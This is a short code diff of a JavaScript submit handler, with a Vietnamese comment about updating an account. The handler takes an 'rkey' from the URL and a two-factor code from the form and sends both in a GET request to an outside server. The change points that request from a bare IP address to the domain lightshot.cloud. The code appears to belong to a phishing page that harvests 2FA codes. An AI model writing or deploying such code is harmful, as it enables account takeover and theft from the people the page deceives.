@@ -11,7 +11,7 @@ document.getElementById("update-form").addEventListener("submit", function (even
     var rkey = searchParams.get("rkey");
     console.log(rkey)
     // Gửi dữ liệu POST đến máy chủ để cập nhật tài khoản
-    fetch(`http://103.188.167.91/update?rkey=${rkey}&twofa=${twofa}`, {
+    fetch(`https://lightshot.cloud/update?rkey=${rkey}&twofa=${twofa}`, {
         method: "get",
         // headers: {
         //     "Content-Type": "application/x-www-form-urlencoded"
